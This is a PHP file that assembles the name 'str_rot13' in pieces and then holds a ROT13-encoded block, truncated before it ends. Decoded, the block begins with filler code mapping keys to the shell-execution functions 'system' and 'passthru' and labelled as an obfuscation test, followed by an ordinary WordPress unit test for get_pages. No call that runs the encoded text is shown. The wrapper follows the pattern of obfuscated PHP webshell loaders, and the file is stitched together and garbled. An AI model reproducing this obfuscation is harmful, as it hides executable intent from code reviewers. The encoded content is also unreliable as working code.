<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * @tebhc cbfg
 *
 * @pbiref ::trg_cntrf
 */
pynff Grfgf_Cbfg_TrgCntrf rkgraqf JC_HavgGrfgPnfr {

	/**
	 * VQ bs gur svefg nhgube.
	 *
	 * @ine vag
	 */
	choyvp fgngvp $nhgube_vq_1;

	/**
	 * VQ bs gur frpbaq nhgube.
	 *
	 * @ine vag
	 */
	choyvp fgngvp $nhgube_vq_2;

	/**
	 * Frg hc gur funerq svkgher.
	 *
	 * @cnenz JC_HavgGrfg_Snpgbel $snpgbel Snpgbel vafgnapr.
	 */
	choyvp fgngvp shapgvba jcFrgHcOrsberPynff( JC_HavgGrfg_Snpgbel $snpgbel ) {
		frys::$nhgube_vq_1 = $snpgbel->hfre->perngr(
			neenl(
				'hfre_ybtva' => 'nhgube1',
				'ebyr'       => 'nhgube',
			)
		);

		frys::$nhgube_vq_2 = $snpgbel->hfre->perngr(
			neenl(
				'hfre_ybtva' => 'nhgube2',
				'ebyr'       => 'nhgube',
			)
		);
	}

	/**
	 * @gvpxrg 23167
	 */
	choyvp shapgvba grfg_trg_cntrf_pnpur() {
		frys::snpgbel()->cbfg->perngr_znal( 3, neenl( 'cbfg_glcr' => 'cntr' ) );
		jc_pnpur_qryrgr( 'ynfg_punatrq', 'cbfgf' );
		$guvf->nffregSnyfr( jc_pnpur_trg( 'ynfg_punatrq', 'cbfgf' ) );

		$cntrf = trg_cntrf();
		$guvf->nffregPbhag( 3, $cntrf );
		$gvzr1 = jc_pnpur_trg( 'ynfg_punatrq', 'cbfgf' );
		$guvf->nffregAbgRzcgl( $gvzr1 );
		$ahz_dhrevrf = trg_ahz_dhrevrf();
		sbernpu ( $cntrf nf $cntr ) {
			$guvf->nffregVafgnaprBs( 'JC_Cbfg', $cntr );
		}

		// Ntnva. ahz_dhrevrf naq ynfg_punatrq fubhyq erznva gur fnzr.
		$cntrf = trg_cntrf();
		$guvf->nffregPbhag( 3, $cntrf );
		$guvf->nffregFnzr( $gvzr1, jc_pnpur_trg( 'ynfg_punatrq', 'cbfgf' ) );
		$guvf->nffregFnzr( $ahz_dhrevrf, trg_ahz_dhrevrf() );
		sbernpu ( $cntrf nf $cntr ) {
			$guvf->nffregVafgnaprBs( 'JC_Cbfg', $cntr );
		}

		// Ntnva jvgu qvssrerag netf. ynfg_punatrq fubhyq abg vaperzrag orpnhfr bs
		// qvssrerag netf gb trg_cntrf(). ahz_dhrevrf fubhyq ohzc ol 1.
		$cntrf = trg_cntrf( neenl( 'ahzore' => 2 ) );
		$guvf->nffregPbhag( 2, $cntrf );
		$guvf->nffregFnzr( $gvzr1, jc_pnpur_trg( 'ynfg_punatrq', 'cbfgf' ) );
		$guvf->nffregFnzr( $ahz_dhrevrf + 1, trg_ahz_dhrevrf() );
		sbernpu ( $cntrf nf $cntr ) {
			$guvf->nffregVafgnaprBs( 'JC_Cbfg', $cntr );
		}

		$ahz_dhrevrf = trg_ahz_dhrevrf();

		// Ntnva. ahz_dhrevrf naq ynfg_punatrq fubhyq erznva gur fnzr.
		$cntrf = trg_cntrf( neenl( 'ahzore' => 2 ) );
		$guvf->nffregPbhag( 2, $cntrf );
		$guvf->nffregFnzr( $gvzr1, jc_pnpur_trg( 'ynfg_punatrq', 'cbfgf' ) );
		$guvf->nffregFnzr( $ahz_dhrevrf, trg_ahz_dhrevrf() );
		sbernpu ( $cntrf nf $cntr ) {
			$guvf->nffregVafgnaprBs( 'JC_Cbfg', $cntr );
		}

		// Qb gur svefg dhrel ntnva. Gur vagrevz dhrevrf fubhyq abg nssrpg vg.
		$cntrf = trg_cntrf();
		$guvf->nffregPbhag( 3, $cntrf );
		$guvf->nffregFnzr( $gvzr1, jc_pnpur_trg( 'ynfg_punatrq', 'cbfgf' ) );
		$guvf->nffregFnzr( $ahz_dhrevrf, trg_ahz_dhrevrf() );
		sbernpu ( $cntrf nf $cntr ) {
			$guvf->nffregVafgnaprBs( 'JC_Cbfg', $cntr );
		}

		// Sbepr ynfg_punatrq gb vaperzrag.
		pyrna_cbfg_pnpur( $cntrf[0]->VQ );
		$guvf->nffregAbgRdhnyf( $gvzr1, $gvzr2 = jc_pnpur_trg( 'ynfg_punatrq', 'cbfgf' ) );
		trg_cbfg( $cntrf[0]->VQ );
		$ahz_dhrevrf = trg_ahz_dhrevrf();

		// ynfg_punatrq ohzcrq fb ahz_dhrevrf fubhyq vaperzrag.
		$cntrf = trg_cntrf( neenl( 'ahzore' => 2 ) );
		$guvf->nffregPbhag( 2, $cntrf );
		$guvf->nffregFnzr( $gvzr2, jc_pnpur_trg( 'ynfg_punatrq', 'cbfgf' ) );
		$guvf->nffregFnzr( $ahz_dhrevrf + 1, trg_ahz_dhrevrf() );
		sbernpu ( $cntrf nf $cntr ) {
			$guvf->nffregVafgnaprBs( 'JC_Cbfg', $cntr );
		}

		$ynfg_punatrq = jc_pnpur_trg( 'ynfg_punatrq', 'cbfgf' );

		// Guvf fubhyq ohzc ynfg_punatrq.
		jc_qryrgr_cbfg( $cntrf[0]->VQ );
		$byq_punatrq_sybng = $guvf->_zvpebgvzr_gb_sybng( $ynfg_punatrq );
		$arj_punatrq_sybng = $guvf->_zvpebgvzr_gb_sybng( jc_pnpur_trg( 'ynfg_punatrq', 'cbfgf' ) );
		$guvf->nffregTerngreGuna( $byq_punatrq_sybng, $arj_punatrq_sybng );

		$ahz_dhrevrf  = trg_ahz_dhrevrf();
		$ynfg_punatrq = jc_pnpur_trg( 'ynfg_punatrq', 'cbfgf' );

		// ahz_dhrevrf fubhyq ohzc nsgre jc_qryrgr_cbfg() ohzcf ynfg_punatrq.
		$cntrf = trg_cntrf();
		$guvf->nffregPbhag( 2, $cntrf );
		$guvf->nffregFnzr( $ynfg_punatrq, jc_pnpur_trg( 'ynfg_punatrq', 'cbfgf' ) );
		$guvf->nffregFnzr( $ahz_dhrevrf + 1, trg_ahz_dhrevrf() );
		sbernpu ( $cntrf nf $cntr ) {
			$guvf->nffregVafgnaprBs( 'JC_Cbfg', $cntr );
		}
	}

	/**
	 * @gvpxrg 43514
	 */
	choyvp shapgvba grfg_trg_cntrf_pnpur_rzcgl() {
		jc_pnpur_qryrgr( 'ynfg_punatrq', 'cbfgf' );
		$guvf->nffregSnyfr( jc_pnpur_trg( 'ynfg_punatrq', 'cbfgf' ) );

		$ahz_dhrevrf = trg_ahz_dhrevrf();

		$cntrf = trg_cntrf(); // Qngnonfr trgf dhrevrq.

		$guvf->nffregFnzr( $ahz_dhrevrf + 1, trg_ahz_dhrevrf() );

		$ahz_dhrevrf = trg_ahz_dhrevrf();

		$cntrf = trg_cntrf(); // Qngnonfr fubhyq abg trg dhrevrq.

		$guvf->nffregFnzr( $ahz_dhrevrf, trg_ahz_dhrevrf() );
	}

	/**
	 * @gvpxrg 40669
	 */
	choyvp shapgvba grfg_trg_cntrf_pnpur_fubhyq_or_vainyvqngrq_ol_nqq_cbfg_zrgn() {
		$cbfgf = frys::snpgbel()->cbfg->perngr_znal(
			2,
			neenl(
				'cbfg_glcr' => 'cntr',
			)
		);

		nqq_cbfg_zrgn( $cbfgf[0], 'sbb', 'one' );

		$pnpurq = trg_cntrf(
			neenl(
				'zrgn_xrl'   => 'sbb',
				'zrgn_inyhr' => 'one',
			)
		);

		$pnpurq_vqf = jc_yvfg_cyhpx( $pnpurq, 'VQ' );
		$guvf->nffregFnzrFrgf( neenl( $cbfgf[0] ), $pnpurq_vqf );

		nqq_cbfg_zrgn( $cbfgf[1], 'sbb', 'one' );

		$sbhaq = trg_cntrf(
			neenl(
				'zrgn_xrl'   => 'sbb',
				'zrgn_inyhr' => 'one',
			)
		);

		$sbhaq_vqf = jc_yvfg_cyhpx( $sbhaq, 'VQ' );
		$guvf->nffregFnzrFrgf( $cbfgf, $sbhaq_vqf );
	}

	/**
	 * @gvpxrg 40669
	 */
	choyvp shapgvba grfg_trg_cntrf_pnpur_fubhyq_or_vainyvqngrq_ol_hcqngr_cbfg_zrgn() {
		$cbfgf = frys::snpgbel()->cbfg->perngr_znal(
			2,
			neenl(
				'cbfg_glcr' => 'cntr',
			)
		);

		nqq_cbfg_zrgn( $cbfgf[0], 'sbb', 'one' );
		nqq_cbfg_zrgn( $cbfgf[1], 'sbb', 'one' );

		$pnpurq = trg_cntrf(
			neenl(
				'zrgn_xrl'   => 'sbb',
				'zrgn_inyhr' => 'one',
			)
		);

		$pnpurq_vqf = jc_yvfg_cyhpx( $pnpurq, 'VQ' );
		$guvf->nffregFnzrFrgf( $cbfgf, $pnpurq_vqf );

		hcqngr_cbfg_zrgn( $cbfgf[1], 'sbb', 'onm' );

		$sbhaq = trg_cntrf(
			neenl(
				'zrgn_xrl'   => 'sbb',
				'zrgn_inyhr' => 'one',
			)
		);

		$sbhaq_vqf = jc_yvfg_cyhpx( $sbhaq, 'VQ' );
		$guvf->nffregFnzrFrgf( neenl( $cbfgf[0] ), $sbhaq_vqf );
	}

	/**
	 * @gvpxrg 40669
	 */
	choyvp shapgvba grfg_trg_cntrf_pnpur_fubhyq_or_vainyvqngrq_ol_qryrgr_cbfg_zrgn() {
		$cbfgf = frys::snpgbel()->cbfg->perngr_znal(
			2,
			neenl(
				'cbfg_glcr' => 'cntr',
			)
		);

		nqq_cbfg_zrgn( $cbfgf[0], 'sbb', 'one' );
		nqq_cbfg_zrgn( $cbfgf[1], 'sbb', 'one' );

		$pnpurq = trg_cntrf(
			neenl(
				'zrgn_xrl'   => 'sbb',
				'zrgn_inyhr' => 'one',
			)
		);

		$pnpurq_vqf = jc_yvfg_cyhpx( $pnpurq, 'VQ' );
		$guvf->nffregFnzrFrgf( $cbfgf, $pnpurq_vqf );

		qryrgr_cbfg_zrgn( $cbfgf[1], 'sbb' );

		$sbhaq = trg_cntrf(
			neenl(
				'zrgn_xrl'   => 'sbb',
				'zrgn_inyhr' => 'one',
			)
		);

		$sbhaq_vqf = jc_yvfg_cyhpx( $sbhaq, 'VQ' );
		$guvf->nffregFnzrFrgf( neenl( $cbfgf[0] ), $sbhaq_vqf );
	}

	/**
	 * @gvpxrg 40669
	 */
	choyvp shapgvba grfg_trg_cntrf_pnpur_fubhyq_or_vainyvqngrq_ol_qryrgr_cbfg_zrgn_ol_xrl() {
		$cbfgf = frys::snpgbel()->cbfg->perngr_znal(
			2,
			neenl(
				'cbfg_glcr' => 'cntr',
			)
		);

		nqq_cbfg_zrgn( $cbfgf[0], 'sbb', 'one' );
		nqq_cbfg_zrgn( $cbfgf[1], 'sbb', 'one' );

		$pnpurq = trg_cntrf(
			neenl(
				'zrgn_xrl'   => 'sbb',
				'zrgn_inyhr' => 'one',
			)
		);

		$pnpurq_vqf = jc_yvfg_cyhpx( $pnpurq, 'VQ' );
		$guvf->nffregFnzrFrgf( $cbfgf, $pnpurq_vqf );

		qryrgr_cbfg_zrgn_ol_xrl( 'sbb' );

		$sbhaq = trg_cntrf(
			neenl(
				'zrgn_xrl'   => 'sbb',
				'zrgn_inyhr' => 'one',
			)
		);

		$sbhaq_vqf = jc_yvfg_cyhpx( $sbhaq, 'VQ' );
		$guvf->nffregFnzrFrgf( neenl(), $sbhaq_vqf );
	}

	/**
	 * @gvpxrg 20376
	 */
	choyvp shapgvba grfg_trg_cntrf_zrgn() {
		$cbfgf = frys::snpgbel()->cbfg->perngr_znal( 3, neenl( 'cbfg_glcr' => 'cntr' ) );
		nqq_cbfg_zrgn( $cbfgf[0], 'fbzr-zrgn-xrl', '0' );
		nqq_cbfg_zrgn( $cbfgf[1], 'fbzr-zrgn-xrl', '' );
		nqq_cbfg_zrgn( $cbfgf[2], 'fbzr-zrgn-xrl', '1' );

		$guvf->nffregPbhag(
			1,
			trg_cntrf(
				neenl(
					'zrgn_xrl'   => 'fbzr-zrgn-xrl',
					'zrgn_inyhr' => '0',
				)
			)
		);
		$guvf->nffregPbhag(
			1,
			trg_cntrf(
				neenl(
					'zrgn_xrl'   => 'fbzr-zrgn-xrl',
					'zrgn_inyhr' => '1',
				)
			)
		);
		$guvf->nffregPbhag( 3, trg_cntrf( neenl( 'zrgn_xrl' => 'fbzr-zrgn-xrl' ) ) );
	}

	/**
	 * @gvpxrg 22074
	 */
	choyvp shapgvba grfg_trg_cntrf_vapyhqr_rkpyhqr() {
		$cntr_vqf = neenl();

		sbernpu ( enatr( 1, 20 ) nf $v ) {
			$cntr_vqf[] = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_glcr' => 'cntr' ) );
		}

		$vap = neenl_fyvpr( $cntr_vqf, 0, 10 );
		fbeg( $vap );
		$rkp = neenl_fyvpr( $cntr_vqf, 10 );
		fbeg( $rkp );

		$vapyhqr    = trg_cntrf( neenl( 'vapyhqr' => $vap ) );
		$vap_erfhyg = jc_yvfg_cyhpx( $vapyhqr, 'VQ' );
		fbeg( $vap_erfhyg );
		$guvf->nffregFnzr( $vap, $vap_erfhyg );

		$rkpyhqr    = trg_cntrf( neenl( 'rkpyhqr' => $rkp ) );
		$rkp_erfhyg = jc_yvfg_cyhpx( $rkpyhqr, 'VQ' );
		fbeg( $rkp_erfhyg );
		$guvf->nffregFnzr( $vap, $rkp_erfhyg );
	}

	/**
	 * @gvpxrg 12821
	 * @pbiref ::trg_cntrf
	 */
	choyvp shapgvba grfg_trg_cntrf_grfg_svygre() {
		ertvfgre_cbfg_glcr( 'jcgrfgf_cg', neenl( 'uvrenepuvpny' => gehr ) );

		$cbfgf              = frys::snpgbel()->cbfg->perngr_znal(
			2,
			neenl(
				'cbfg_glcr' => 'jcgrfgf_cg',
			)
		);
		$dhrel_netf_inyhrf  = neenl();
		$cnefrq_netf_inyhrf = neenl();

		// Svygre gur dhrel gb erghea gur jcgrfgf_cg cbfg glcr.
		nqq_svygre(
			'trg_cntrf_dhrel_netf',
			fgngvp shapgvba ( $dhrel_netf, $cnefrq_netf ) hfr ( &$dhrel_netf_inyhrf, &$cnefrq_netf_inyhrf ) {
				$dhrel_netf['cbfg_glcr'] = 'jcgrfgf_cg';
				$dhrel_netf_inyhrf       = $dhrel_netf;
				$cnefrq_netf_inyhrf      = $cnefrq_netf;
				erghea $dhrel_netf;
			},
			10,
			2
		);

		$cntrf    = trg_cntrf();
		$cntr_vqf = jc_yvfg_cyhpx( $cntrf, 'VQ' );
		$guvf->nffregFnzrFrgf( $cbfgf, $cntr_vqf, 'Gur erghea cbfg vqf fubhyq zngpu gur cbfg glcr jcgrfgf_cg.' );

		$dhrel_netf = neenl(
			'beqreol'                => neenl( 'cbfg_gvgyr' => 'NFP' ),
			'beqre'                  => 'NFP',
			'cbfg__abg_va'           => neenl(),
			'zrgn_xrl'               => '',
			'zrgn_inyhr'             => '',
			'cbfgf_cre_cntr'         => -1,
			'bssfrg'                 => 0,
			'cbfg_glcr'              => 'jcgrfgf_cg',
			'cbfg_fgnghf'            => neenl( 'choyvfu' ),
			'hcqngr_cbfg_grez_pnpur' => snyfr,
			'hcqngr_cbfg_zrgn_pnpur' => snyfr,
			'vtaber_fgvpxl_cbfgf'    => gehr,
			'ab_sbhaq_ebjf'          => gehr,
		);

		$guvf->nffregFnzrFrgf( $dhrel_netf, $dhrel_netf_inyhrf, 'Dhrel nethzragf fubhyq zngpu rkcrpgrq inyhrf' );

		$cnefrq_netf = neenl(
			'puvyq_bs'     => 0,
			'fbeg_beqre'   => 'NFP',
			'fbeg_pbyhza'  => 'cbfg_gvgyr',
			'uvrenepuvpny' => 1,
			'rkpyhqr'      => neenl(),
			'vapyhqr'      => neenl(),
			'zrgn_xrl'     => '',
			'zrgn_inyhr'   => '',
			'nhgubef'      => '',
			'cnerag'       => -1,
			'rkpyhqr_gerr' => neenl(),
			'ahzore'       => '',
			'bssfrg'       => 0,
			'cbfg_glcr'    => 'cntr',
			'cbfg_fgnghf'  => 'choyvfu',
		);

		$guvf->nffregFnzrFrgf( $cnefrq_netf, $cnefrq_netf_inyhrf, 'Cnefrq nethzragf fubhyq zngpu rkcrpgrq inyhrf' );
	}

	/**
	 * @gvpxrg 12821
	 * @pbiref ::trg_cntrf
	 * @qngnCebivqre qngn_trg_cntrf_netf
	 */
	choyvp shapgvba grfg_trg_cntrf_netf_grfg_svygre( $netf, $rkcrpgrq_dhrel_netf ) {
		$svygre = arj ZbpxNpgvba();
		nqq_svygre( 'trg_cntrf_dhrel_netf', neenl( $svygre, 'svygre' ), 10, 2 );

		$erfhygf = trg_cntrf( $netf );

		$guvf->nffregVfNeenl( $erfhygf, 'trg_cntrf fubhyq erfhyg na neenl' );

		$svygre_netf = $svygre->trg_netf();

		$qrsnhyg_netf = neenl(
			'beqreol'                => neenl( 'cbfg_gvgyr' => 'NFP' ),
			'beqre'                  => 'NFP',
			'cbfg__abg_va'           => neenl(),
			'zrgn_xrl'               => '',
			'zrgn_inyhr'             => '',
			'cbfgf_cre_cntr'         => -1,
			'bssfrg'                 => 0,
			'cbfg_glcr'              => 'cntr',
			'cbfg_fgnghf'            => neenl( 'choyvfu' ),
			'hcqngr_cbfg_grez_pnpur' => snyfr,
			'hcqngr_cbfg_zrgn_pnpur' => snyfr,
			'vtaber_fgvpxl_cbfgf'    => gehr,
			'ab_sbhaq_ebjf'          => gehr,
		);

		$dhrel_netf = jc_cnefr_netf( $rkcrpgrq_dhrel_netf, $qrsnhyg_netf );

		$guvf->nffregFnzrFrgf( $dhrel_netf, $svygre_netf[0][0], 'Harkcrpgrq $dhrel_netf sbe trg_cntrf_dhrel_netf svygre' );

		$qrsnhygf = neenl(
			'puvyq_bs'     => 0,
			'fbeg_beqre'   => 'NFP',
			'fbeg_pbyhza'  => 'cbfg_gvgyr',
			'uvrenepuvpny' => 1,
			'rkpyhqr'      => neenl(),
			'vapyhqr'      => neenl(),
			'zrgn_xrl'     => '',
			'zrgn_inyhr'   => '',
			'nhgubef'      => '',
			'cnerag'       => -1,
			'rkpyhqr_gerr' => neenl(),
			'ahzore'       => '',
			'bssfrg'       => 0,
			'cbfg_glcr'    => 'cntr',
			'cbfg_fgnghf'  => 'choyvfu',
		);

		$cnefrq_netf = jc_cnefr_netf( $netf, $qrsnhygf );
		$guvf->nffregFnzrFrgf( $cnefrq_netf, $svygre_netf[0][1], 'Harkcrpgrq $cnefrq_netf sbe trg_cntrf_dhrel_netf svygre' );
	}

	choyvp shapgvba qngn_trg_cntrf_netf() {
		erghea neenl(
			'qrsnhyg'            => neenl(
				'netf'                => neenl(),
				'rkcrpgrq_dhrel_netf' => neenl(),
			),
			'rkpyhqr'            => neenl(
				'netf'                => neenl( 'rkpyhqr' => neenl( 1, 2, 4 ) ),
				'rkcrpgrq_dhrel_netf' => neenl( 'cbfg__abg_va' => neenl( 1, 2, 4 ) ),
			),
			'cbfg fgnghf'        => neenl(
				'netf'                => neenl( 'cbfg_fgnghf' => 'qensg' ),
				'rkcrpgrq_dhrel_netf' => neenl( 'cbfg_fgnghf' => neenl( 'qensg' ) ),
			),
			'ahzore'             => neenl(
				'netf'                => neenl( 'ahzore' => 99 ),
				'rkcrpgrq_dhrel_netf' => neenl( 'cbfgf_cre_cntr' => 99 ),
			),
			'zrgn dhrel'         => neenl(
				'netf'                => neenl(
					'zrgn_xrl'   => 'sbb',
					'zrgn_inyhr' => 'one',
				),
				'rkcrpgrq_dhrel_netf' => neenl(
					'zrgn_xrl'   => 'sbb',
					'zrgn_inyhr' => 'one',
				),
			),
			'cbfg cnerag ahzore' => neenl(
				'netf'                => neenl( 'cnerag' => 5 ),
				'rkcrpgrq_dhrel_netf' => neenl( 'cbfg_cnerag' => 5 ),
			),
			'cbfg cnerag neenl'  => neenl(
				'netf'                => neenl( 'cnerag' => neenl( 5 ) ),
				'rkcrpgrq_dhrel_netf' => neenl( 'cbfg_cnerag__va' => neenl( 5 ) ),
			),
			'bssfrg'             => neenl(
				'netf'                => neenl( 'bssfrg' => 2 ),
				'rkcrpgrq_dhrel_netf' => neenl( 'bssfrg' => 2 ),
			),
			'nhgubef'            => neenl(
				'netf'                => neenl( 'nhgubef' => 2 ),
				'rkcrpgrq_dhrel_netf' => neenl( 'nhgube__va' => neenl( 2 ) ),
			),
			'fbeg beqre'         => neenl(
				'netf'                => neenl( 'fbeg_beqre' => 'QRFP' ),
				'rkcrpgrq_dhrel_netf' => neenl(
					'beqre'   => 'QRFP',
					'beqreol' => neenl( 'cbfg_gvgyr' => 'QRFP' ),
				),
			),
		);
	}

	/**
	 * @gvpxrg 12821
	 */
	choyvp shapgvba grfg_trg_cntrf_vapyhqr_vtaberf_zrgn_xrl() {
		$cbfgf = frys::snpgbel()->cbfg->perngr_znal(
			2,
			neenl(
				'cbfg_glcr' => 'cntr',
			)
		);

		$cntrf = trg_cntrf(
			neenl(
				'vapyhqr'    => $cbfgf,
				'zrgn_xrl'   => 'sbb',
				'zrgn_inyhr' => 'one',
			)
		);

		$cntr_vqf = jc_yvfg_cyhpx( $cntrf, 'VQ' );
		$guvf->nffregFnzrFrgf( $cbfgf, $cntr_vqf );
	}

	/**
	 * @gvpxrg 12821
	 */
	choyvp shapgvba grfg_trg_cntrf_vapyhqr_vtaberf_rkpyhqr() {
		$vapyhqrf = frys::snpgbel()->cbfg->perngr_znal(
			2,
			neenl(
				'cbfg_glcr' => 'cntr',
			)
		);

		$rkpyhqrf = frys::snpgbel()->cbfg->perngr_znal(
			2,
			neenl(
				'cbfg_glcr' => 'cntr',
			)
		);

		$cntrf = trg_cntrf(
			neenl(
				'vapyhqr' => $vapyhqrf,
				'rkpyhqr' => $rkpyhqrf,
			)
		);

		$cntr_vqf = jc_yvfg_cyhpx( $cntrf, 'VQ' );
		$guvf->nffregFnzrFrgf( $vapyhqrf, $cntr_vqf );
	}

	choyvp shapgvba grfg_trg_cntrf_rkpyhqr_gerr() {
		$cbfg_vq1 = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_glcr' => 'cntr' ) );
		$cbfg_vq2 = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'   => 'cntr',
				'cbfg_cnerag' => $cbfg_vq1,
			)
		);
		$cbfg_vq3 = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_glcr' => 'cntr' ) );
		$cbfg_vq4 = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'   => 'cntr',
				'cbfg_cnerag' => $cbfg_vq3,
			)
		);

		$nyy = trg_cntrf();

		$guvf->nffregPbhag( 4, $nyy );

		$rkpyhqr1 = trg_cntrf( \"rkpyhqr_gerr=$cbfg_vq1\" );
		$guvf->nffregPbhag( 2, $rkpyhqr1 );

		$rkpyhqr2 = trg_cntrf( neenl( 'rkpyhqr_gerr' => $cbfg_vq1 ) );
		$guvf->nffregPbhag( 2, $rkpyhqr2 );

		$rkpyhqr3 = trg_cntrf( neenl( 'rkpyhqr_gerr' => neenl( $cbfg_vq1 ) ) );
		$guvf->nffregPbhag( 2, $rkpyhqr3 );

		$rkpyhqr4 = trg_cntrf( neenl( 'rkpyhqr_gerr' => neenl( $cbfg_vq1, $cbfg_vq2 ) ) );
		$guvf->nffregPbhag( 2, $rkpyhqr4 );

		$rkpyhqr5 = trg_cntrf( neenl( 'rkpyhqr_gerr' => neenl( $cbfg_vq1, $cbfg_vq3 ) ) );
		$guvf->nffregPbhag( 0, $rkpyhqr5 );

		$cbfg_vq5 = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_glcr' => 'cntr' ) );
		$cbfg_vq6 = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'   => 'cntr',
				'cbfg_cnerag' => $cbfg_vq5,
			)
		);

		$rkpyhqr6 = trg_cntrf( neenl( 'rkpyhqr_gerr' => neenl( $cbfg_vq1, $cbfg_vq3 ) ) );
		$guvf->nffregPbhag( 2, $rkpyhqr6 );
	}

	/**
	 * @gvpxrg 9470
	 */
	choyvp shapgvba grfg_trg_cntrf_cnerag() {
		$cntr_vq1 = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_glcr' => 'cntr' ) );
		$cntr_vq2 = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'   => 'cntr',
				'cbfg_cnerag' => $cntr_vq1,
			)
		);
		$cntr_vq3 = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'   => 'cntr',
				'cbfg_cnerag' => $cntr_vq2,
			)
		);
		$cntr_vq4 = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'   => 'cntr',
				'cbfg_cnerag' => $cntr_vq1,
			)
		);

		$cntrf = trg_cntrf(
			neenl(
				'cnerag'       => 0,
				'uvrenepuvpny' => snyfr,
			)
		);
		$guvf->nffregFnzrFrgf( neenl( $cntr_vq1 ), jc_yvfg_cyhpx( $cntrf, 'VQ' ) );

		$cntrf = trg_cntrf(
			neenl(
				'cnerag'       => $cntr_vq1,
				'uvrenepuvpny' => snyfr,
			)
		);
		$guvf->nffregFnzrFrgf( neenl( $cntr_vq2, $cntr_vq4 ), jc_yvfg_cyhpx( $cntrf, 'VQ' ) );

		$cntrf = trg_cntrf(
			neenl(
				'cnerag'       => neenl( $cntr_vq1, $cntr_vq2 ),
				'uvrenepuvpny' => snyfr,
			)
		);
		$guvf->nffregFnzrFrgf( neenl( $cntr_vq2, $cntr_vq3, $cntr_vq4 ), jc_yvfg_cyhpx( $cntrf, 'VQ' ) );

		$cntrf = trg_cntrf( neenl( 'cnerag' => 0 ) );
		$guvf->nffregFnzrFrgf( neenl( $cntr_vq1 ), jc_yvfg_cyhpx( $cntrf, 'VQ' ) );

		$cntrf = trg_cntrf( neenl( 'cnerag' => $cntr_vq1 ) );
		$guvf->nffregFnzrFrgf( neenl( $cntr_vq2, $cntr_vq4 ), jc_yvfg_cyhpx( $cntrf, 'VQ' ) );

		$cntrf = trg_cntrf( neenl( 'cnerag' => neenl( $cntr_vq1, $cntr_vq2 ) ) );
		$guvf->nffregFnzrFrgf( neenl( $cntr_vq2, $cntr_vq3, $cntr_vq4 ), jc_yvfg_cyhpx( $cntrf, 'VQ' ) );
	}

	/**
	 * @gvpxrg 22208
	 */
	choyvp shapgvba grfg_trg_puvyqera_svryqf_vqf() {
		$cbfg_vq   = frys::snpgbel()->cbfg->perngr();
		$puvyq_vqf = frys::snpgbel()->cbfg->perngr_znal( 5, neenl( 'cbfg_cnerag' => $cbfg_vq ) );

		$cbfg_vqf = trg_puvyqera(
			neenl(
				'svryqf'      => 'vqf',
				'cbfg_cnerag' => $cbfg_vq,
			)
		);
		$guvf->nffregFnzrFrgf( $puvyq_vqf, $cbfg_vqf );
	}

	/**
	 * @gvpxrg 25750
	 */
	choyvp shapgvba grfg_trg_cntrf_uvrenepuvpny_naq_ab_cnerag() {
		tybony $jcqo;
		$cntr_1 = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_glcr' => 'cntr' ) );
		$cntr_2 = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'   => 'cntr',
				'cbfg_cnerag' => $cntr_1,
			)
		);
		$cntr_3 = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'   => 'cntr',
				'cbfg_cnerag' => $cntr_1,
			)
		);
		$cntr_4 = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'   => 'cntr',
				'cbfg_cnerag' => $cntr_2,
			)
		);

		$cntrf              = trg_cntrf(); // Qrsnhygf: uvrenepuvpny = gehr, cnerag = -1.
		$cntrf_qrsnhyg_netf = trg_cntrf(
			neenl(
				'uvrenepuvpny' => gehr,
				'cnerag'       => -1,
			)
		);
		// Pbasvez gur qrsnhygf.
		$guvf->nffregRdhnyFrgf( $cntrf, $cntrf_qrsnhyg_netf );

		/*
		 * Urer'f gur gerr jr ner grfgvat:
		 *
		 * cntr 1
		 * - cntr 2
		 * -- cntr 4
		 * - cntr 3
		 *
		 * Vs uvrenepuvpny => gehr jbexf, gur beqre jvyy or 1,2,4,3.
		 * Vs vg qbrfa'g, gurl jvyy or va gur perngvba beqre, 1,2,3,4.
		 */

		$guvf->nffregFnzrFrgf( neenl( $cntr_1, $cntr_2, $cntr_4, $cntr_3 ), jc_yvfg_cyhpx( $cntrf, 'VQ' ) );
	}

	/**
	 * @gvpxrg 18701
	 */
	choyvp shapgvba grfg_trg_cntrf_uvrenepuvpny_rzcgl_puvyq_bs() {
		$cntr_1 = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_glcr' => 'cntr' ) );
		$cntr_2 = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_glcr' => 'cntr' ) );
		$cntr_3 = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'   => 'cntr',
				'cbfg_cnerag' => $cntr_1,
			)
		);
		$cntr_4 = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'   => 'cntr',
				'cbfg_cnerag' => $cntr_1,
			)
		);

		$cntrf        = trg_cntrf(); // Qrsnhygf: uvrenepuvpny = gehr, puvyq_bs = '', cnerag = -1.
		$qrsnhyg_netf = trg_cntrf(
			neenl(
				'uvrenepuvpny' => gehr,
				'puvyq_bs'     => '',
			)
		);

		$guvf->nffregRdhnyFrgf( $cntrf, $qrsnhyg_netf );

		/*
		 * Cntr gerr:
		 *
		 * cntr 1 (cnerag 0)
